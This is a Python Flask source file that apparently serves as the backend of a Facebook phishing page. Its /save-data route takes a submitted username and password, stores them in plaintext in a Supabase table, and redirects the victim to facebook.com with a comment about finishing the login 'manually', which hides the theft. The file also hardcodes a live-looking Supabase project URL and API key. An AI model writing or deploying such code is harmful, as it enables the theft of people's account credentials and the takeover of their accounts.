from flask import Flask, request, render_template, jsonify, redirect, url_for
from supabase import create_client, Client

app = Flask(__name__)

SUPABASE_URL = "https://owoyzrflcazopadcsyvo.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im93b3l6cmZsY2F6b3BhZGNzeXZvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzQ4OTYwNDUsImV4cCI6MjA1MDQ3MjA0NX0.Sorhymr26eaWHep_bVj2DNklZeKJK9NKRLLhjj3U47E"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    username = data.get("username")
    password = data.get("password")

    try:
        # Guardar en Supabase
        response = supabase.table("Brandell").insert(
            {"username": username, "password": password}
        ).execute()

        if response.get("status_code") != 200:
            return jsonify({"status": "error", "message": "Failed to save data"}), 500

        # Redirigir al usuario a Facebook para que complete el login manualmente
        return jsonify({
            "status": "success",
            "message": "Data saved successfully",
            "redirect_url": "https://www.facebook.com/"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=5000)
